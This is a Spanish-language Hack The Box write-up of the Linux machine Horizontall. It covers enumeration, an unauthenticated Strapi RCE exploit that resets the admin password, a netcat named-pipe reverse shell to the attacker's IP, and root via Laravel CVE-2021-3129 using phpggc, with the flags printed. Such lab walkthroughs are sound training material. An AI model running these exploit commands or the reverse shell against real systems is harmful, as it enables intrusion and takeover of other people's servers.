---
category: Hack The Box
tags:
  - eJPT
  - eWPT
title: Machine Horizontall
comments: "true"
image: /assets/img/machines/Horizontall/Horizontallbanner.jpeg
---
## Introducción
Horizontall es una máquina Linux de dificultad fácil que expone únicamente los servicios HTTP y SSH. Durante la enumeración inicial, se identificó que el sitio web está construido con el framework Vue.js y que, a través del análisis del código fuente JavaScript, se descubrió un subdominio oculto que aloja una instancia de Strapi Headless CMS vulnerable a una ejecución remota de código (RCE) sin autenticación. Aprovechando esta vulnerabilidad, se obtuvo acceso al sistema con el usuario strapi. Luego, al investigar los servicios locales, se encontró una instancia desactualizada de Laravel en modo debug escuchando solo en localhost, que fue accesada mediante un túnel SSH. Explotando un CVE conocido en Laravel, se logró una escalada de privilegios a root, completando la cadena de explotación y comprometiendo completamente la máquina.

## Skills
- Strapi CMS Exploitation
- Laravel Exploitation CVE-2021-3129

## Enumeración
La enumeración inicial comenzó con un escaneo de puertos, donde se identificaron dos servicios expuestos: SSH en el puerto 22 (OpenSSH 7.6p1) y HTTP en el puerto 80, servido por nginx 1.14.0. El encabezado HTTP sugiere que el sitio realiza una redirección a horizontall.htb, lo cual indica la posible presencia de un Virtual Host personalizado, el cual debe ser agregado al archivo /etc/hosts para poder acceder correctamente al sitio.
```bash
❯ nmap -sCV -p22,80 10.10.11.105
Nmap scan report for 10.10.11.105
Host is up (0.22s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: Did not follow redirect to http://horizontall.htb
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Para poder acceder correctamente al sitio web que responde con el dominio virtual horizontall.htb, se agregó la siguiente entrada al archivo /etc/hosts:
```bash
❯ echo "10.10.11.105 horizontall.htb" >> /etc/hosts
```

### Enumeración WEB
Utilice whatweb para identificar tecnologías en uso por el servidor web. El escaneo reveló que el servidor está basado en nginx 1.14.0 corriendo sobre Ubuntu, y que la IP redirige a un virtual host llamado horizontall.htb. Esto confirmó la necesidad del host mapping para una correcta visualización y análisis del sitio:
```bash
❯ whatweb 10.10.11.105
http://10.10.11.105 [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.14.0 (Ubuntu)], IP[10.10.11.105], RedirectLocation[http://horizontall.htb], Title[301 Moved Permanently], nginx[1.14.0]
http://horizontall.htb [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.14.0 (Ubuntu)], IP[10.10.11.105], Script, Title[horizontall], X-UA-Compatible[IE=edge], nginx[1.14.0]
```
![1](/assets/img/machines/Horizontall/1.jpeg)

Con el objetivo de identificar rutas ocultas o recursos accesibles, se utilizó wfuzz. El escaneo se ejecutó con múltiples hilos y filtrando las respuestas 404:
```bash
 wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://horizontall.htb/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://horizontall.htb/FUZZ
Total requests: 220546

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                         
=====================================================================

000000025:   301        7 L      13 W       194 Ch      "img"                                                                                           
000000536:   301        7 L      13 W       194 Ch      "css"                                                                                           
000045226:   200        1 L      43 W       901 Ch      "http://horizontall.htb/"                                                                       
000000939:   301        7 L      13 W       194 Ch      "js"                                                                                            

Total time: 0
Processed Requests: 76927
Filtered Requests: 76923
Requests/sec.: 0
```

Al analizar el sitio web principal, se identificó que estaba construido con Vue.js, lo cual sugiere que gran parte de la lógica del frontend se encuentra en archivos JavaScript externos. Se accedió al archivo app.c68eb462.js ubicado en la ruta /js/, y al inspeccionar su contenido buscando menciones al dominio horizontall.htb, se identificó una referencia directa al subdominio api-prod.horizontall.htb. Este hallazgo indica que el frontend interactúa con una API alojada en ese subdominio.
![2](/assets/img/machines/Horizontall/2.jpeg)

Una vez identificado el subdominio api-prod.horizontall.htb dentro del archivo JavaScript, se procedió a agregarlo manualmente al archivo /etc/hosts para poder resolver correctamente el nombre desde la máquina atacante. Esto se hizo añadiendo la línea 10.10.11.105 api-prod.horizontall.htb.
```bash
❯ echo "10.10.11.105 api-prod.horizontall.htb" >> /etc/hosts
```

Tras agregar correctamente el subdominio al archivo /etc/hosts, accedí a http://api-prod.horizontall.htb desde el navegador. La interfaz web respondió con un mensaje de bienvenida simple, mostrando únicamente la palabra “Welcome”, lo cual confirma que el subdominio está activo y funcionando, pero no entrega mucha información a simple vista.
![3](/assets/img/machines/Horizontall/3.jpeg)

Realice un escaneo de directorios en el subdominio api-prod.horizontall.htb utilizando wfuzz para descubrir rutas accesibles. El fuzzing arrojó varias rutas válidas con respuestas 200, incluyendo /reviews, /admin.
```bash
❯ wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://api-prod.horizontall.htb/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://api-prod.horizontall.htb/FUZZ
Total requests: 220546

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                         
=====================================================================

000000123:   200        0 L      21 W       507 Ch      "reviews"                                                                                       
000000245:   200        16 L     101 W      854 Ch      "admin"                                                                                         
000001595:   200        0 L      21 W       507 Ch      "Reviews"                                                                                       
000003687:   403        0 L      1 W        60 Ch       "Users"                                                                                         
000006084:   200        16 L     101 W      854 Ch      "Admin"                                                                                         
000000188:   403        0 L      1 W        60 Ch       "users"                                                                                         
000029295:   200        0 L      21 W       507 Ch      "REVIEWS"                                                                                       
000045226:   200        19 L     33 W       413 Ch      "http://api-prod.horizontall.htb/"                                                              
```

Al acceder a la ruta /admin, se encontró la interfaz de login de Strapi, un popular CMS Headless. Esta página confirma que el servicio Strapi está expuesto y en uso.
![4](/assets/img/machines/Horizontall/4.jpeg)

## Strapi CMS Exploitation
Para identificar la versión exacta del CMS Strapi, se realizó una consulta con curl a la ruta /admin/strapiVersion en el subdominio api-prod.horizontall.htb. La respuesta indicó que la versión instalada es 3.0.0-beta.17.4, una versión beta conocida por tener varias vulnerabilidades que pueden ser explotadas para obtener acceso no autorizado y ejecución remota de código.
```bash
❯ curl api-prod.horizontall.htb/admin/strapiVersion
{"strapiVersion":"3.0.0-beta.17.4"}#           
```

Tras identificar la versión vulnerable de Strapi, se realizó una búsqueda usando searchsploit strapi, encontrando varios exploits relevantes. Se descargó el exploit titulado "Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated)" que permite ejecutar código de forma remota sin necesidad de autenticación, aprovechando una vulnerabilidad crítica en esta versión específica del CMS.
```bash
❯ searchsploit strapi
------------------------------------------------------------------------------------------------------------------------------- ----------------------------
 Exploit Title                                                                                                                 |  Path
------------------------------------------------------------------------------------------------------------------------------- ----------------------------
Strapi 3.0.0-beta - Set Password (Unauthenticated)                                                                             | multiple/webapps/50237.py
Strapi 3.0.0-beta.17.7 - Remote Code Execution (RCE) (Authenticated)                                                           | multiple/webapps/50238.py
Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated)                                                     | multiple/webapps/50239.py
Strapi CMS 3.0.0-beta.17.4 - Set Password (Unauthenticated) (Metasploit)                                                       | nodejs/webapps/50716.rb
------------------------------------------------------------------------------------------------------------------------------- ----------------------------
Shellcodes: No Results
Papers: No Results
```

Antes de ejecutar el exploit, preparé mi equipo para recibir la conexión inversa poniendo un listener en el puerto 443.
```bash
❯ nc -nlvp 443
```

Ejecuté el exploit de Strapi apuntando a la URL vulnerable http://api-prod.horizontall.htb. El exploit confirmó que la versión del CMS era vulnerable y procedió a resetear la contraseña del usuario administrador, entregándome nuevas credenciales (admin:SuperStrongPassword1) y un token JWT para autenticación. Luego, ejecuté un comando para abrir una reverse shell usando una named pipe y netcat, lo que me permitió obtener acceso remoto a la máquina con el usuario strapi.
```bash
❯ python3 50239.py http://api-prod.horizontall.htb
[+] Checking Strapi CMS Version running
[+] Seems like the exploit will work!!!
[+] Executing exploit


[+] Password reset was successfully
[+] Your email is: admin@horizontall.htb
[+] Your new credentials are: admin:SuperStrongPassword1
[+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNzUxMzg0OTc0LCJleHAiOjE3NTM5NzY5NzR9.jMhuKeNi0Myzyf_APTErR70XpUETKP6PeGuKsrxJcZQ


$> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash 2>&1|nc 10.10.16.4 443 >/tmp/f
[+] Triggering Remote code executin
[*] Rember this is a blind RCE don't expect to see output
```

Tras ejecutar el exploit y activar la reverse shell, recibí la conexión entrante en mi equipo. Confirmé el acceso remoto ejecutando el comando id, que mostró que estaba conectado como el usuario strapi (UID 1001), con los grupos correspondientes. Esto me permitió comenzar la exploración interna de la máquina desde esta cuenta comprometida.
```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.4] from (UNKNOWN) [10.10.11.105] 35164
id
uid=1001(strapi) gid=1001(strapi) groups=1001(strapi)
```

### Captura flag usuario
Después de obtener acceso como el usuario strapi, realicé una exploración básica de directorios y me dirigí al directorio /home/developer, donde encontré la flag user.txt.
```bash
strapi@horizontall:~/myapi$ ls
api    config      favicon.ico   package.json       public
build  extensions  node_modules  package-lock.json  README.md
strapi@horizontall:~/myapi$ cd
strapi@horizontall:~$ cd /home
strapi@horizontall:/home$ ls
developer
strapi@horizontall:/home$ cd developer/
strapi@horizontall:/home/developer$ ls
composer-setup.php  myproject  user.txt
strapi@horizontall:/home/developer$ cat user.txt
06cdf62c309964aaf8c2b7074dbe8852
strapi@horizontall:/home/developer$ 
```

Después de obtener acceso como usuario strapi, ejecuté netstat para revisar los puertos en escucha y encontré que además de los puertos habituales, el puerto 8000 estaba escuchando solo en localhost (127.0.0.1:8000). Esto indicaba la presencia de un servicio local accesible únicamente desde la máquina.
```bash
strapi@horizontall:/home/developer$ netstat -tnlp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LISTEN      1884/node /usr/bin/ 
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
```

Para identificar qué servicio estaba escuchando en el puerto 8000, ejecuté un curl. La respuesta reveló que se estaba ejecutando una aplicación Laravel versión 8, corriendo sobre PHP 7.4.18. Esto confirmó que el puerto correspondía a un servicio web Laravel accesible solo desde localhost.
```bash
strapi@horizontall:/home/developer$ curl 127.0.0.1:8000
```

## CVE-2021-3129
Continuando con la enumeración, identifiqué que la versión de Laravel 8 que se estaba ejecutando era vulnerable al CVE-2021-3129, una vulnerabilidad crítica que permite la ejecución remota de código debido a un problema en el modo debug activado. 

Para explotar la vulnerabilidad en Laravel, levanté un servidor HTTP simple en mi máquina local con python3 -m http.server 9090 para hospedar el script de explotación y facilitar su transferencia a la máquina objetivo.
```bash
❯ python3 -m http.server 9090
```

Descargué el script  directamente en la máquina objetivo usando wget.
```bash
strapi@horizontall:/home/developer$ cd /tmp
strapi@horizontall:/tmp$ wget http://10.10.16.4:9090/CVE-2021-3129_exploit/exploit.py
--2025-07-01 16:01:32--  http://10.10.16.4:9090/CVE-2021-3129_exploit/exploit.py
Connecting to 10.10.16.4:9090... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2935 (2.9K) [text/x-python]
Saving to: ‘exploit.py’

exploit.py          100%[===================>]   2.87K  14.5KB/s    in 0.2s    

2025-07-01 16:01:33 (14.5 KB/s) - ‘exploit.py’ saved [2935/2935]
```

Antes de ejecutar el exploit, verifiqué si la máquina objetivo tenía acceso a internet mediante un ping, pero observé que no había conectividad, lo que implicaba que el exploit que requería descargar recursos externos no funcionaría directamente desde la máquina.
```bash
strapi@horizontall:/tmp$ ping 8.8.8.8 -c 4
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.

--- 8.8.8.8 ping statistics ---
4 packets transmitted, 0 received, 100% packet loss, time 3071ms
```

Al no contar con acceso a Internet en la máquina para descargar las dependencias necesarias durante la explotación, cloné el repositorio phpggc desde mi equipo. Esto me permitió disponer de todas las herramientas y recursos necesarios de manera local para preparar y ejecutar el exploit sin depender de la conectividad de la maquina.
```bash
❯ git clone https://github.com/ambionics/phpggc.git
Clonando en 'phpggc'...
remote: Enumerating objects: 4769, done.
remote: Counting objects: 100% (857/857), done.
remote: Compressing objects: 100% (297/297), done.
remote: Total 4769 (delta 653), reused 560 (delta 560), pack-reused 3912 (from 2)
Recibiendo objetos: 100% (4769/4769), 691.56 KiB | 611.00 KiB/s, listo.
Resolviendo deltas: 100% (2185/2185), listo.
```

Para facilitar la transferencia de la herramienta phpggc a la máquina, empaqueté todo el directorio phpggc en un archivo tar. 
```bash
❯ tar cvf phpggc.tar phpggc
```

Para transferir la herramienta phpggc a la máquina objetivo descargué el archivo comprimido usando wget. 
```bash
strapi@horizontall:/tmp$ wget http://10.10.16.4:9090/phpggc.tar
--2025-07-01 16:10:50--  http://10.10.16.4:9090/phpggc.tar
Connecting to 10.10.16.4:9090... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1781760 (1.7M) [application/x-tar]
Saving to: ‘phpggc.tar’

phpggc.tar          100%[===================>]   1.70M   429KB/s    in 5.0s    

2025-07-01 16:10:56 (347 KB/s) - ‘phpggc.tar’ saved [1781760/1781760]
```

Una vez transferido el archivo phpggc.tar al servidor, lo descomprimí en el directorio /tmp.
```bash
strapi@horizontall:/tmp$ tar xvf phpggc.tar
```

Ejecuté el exploit contra el servicio Laravel que escucha en el puerto 8000 mediante el script exploit.py usando el gadget Monolog/RCE1 para ejecutar el comando id. El exploit limpió los logs, generó y desplegó con éxito el payload PHAR, lo que resultó en la ejecución remota de código con privilegios de root, confirmado al obtener el UID 0 en la salida del comando.
```bash
strapi@horizontall:/tmp$ python3 exploit.py http://localhost:8000 Monolog/RCE1 "id"
[i] Trying to clear logs
[+] Logs cleared
[+] PHPGGC found. Generating payload and deploy it to the target
[+] Successfully converted logs to PHAR
[+] PHAR deserialized. Exploited

uid=0(root) gid=0(root) groups=0(root)

[i] Trying to clear logs
[+] Logs cleared
```

### Captura flag root
Finalmente, utilicé el exploit para ejecutar el comando cat /root/root.txt en el servidor a través de la vulnerabilidad de Laravel, logrando obtener la flag de root.
```bash
strapi@horizontall:/tmp$ python3 exploit.py http://localhost:8000 Monolog/RCE1 "cat /root/root.txt"
[i] Trying to clear logs 
[+] Logs cleared
[+] PHPGGC found. Generating payload and deploy it to the target
[+] Successfully converted logs to PHAR
[+] PHAR deserialized. Exploited

3b28e56bc2af90466e1e9848dd075b3c

[i] Trying to clear logs
[+] Logs cleared
```
